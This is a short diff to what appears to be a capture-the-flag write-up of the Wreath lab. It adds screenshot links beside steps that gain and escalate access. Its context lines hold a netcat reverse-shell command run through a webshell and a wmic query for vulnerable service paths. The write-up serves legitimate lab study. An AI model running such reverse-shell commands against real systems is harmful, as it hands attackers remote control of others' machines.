@@ -616,6 +616,7 @@ Executed via webshell:
 ```
 powershell.exe c:\windows\temp\nc-elliot.exe 10.250.180.3 7777 -e cmd.exe
 ```
+![photo-no12](/assets/images/wreath-images/wreath 12.png)
 
 **Result:** Shell obtained as low-privileged user!
 
@@ -644,7 +645,7 @@ wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows
 ```
 
 **Found Vulnerable Service:**
-
+![photo-no13](/assets/images/wreath-images/wreath 13.png)
 ```
 SystemExplorerHelpService
 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
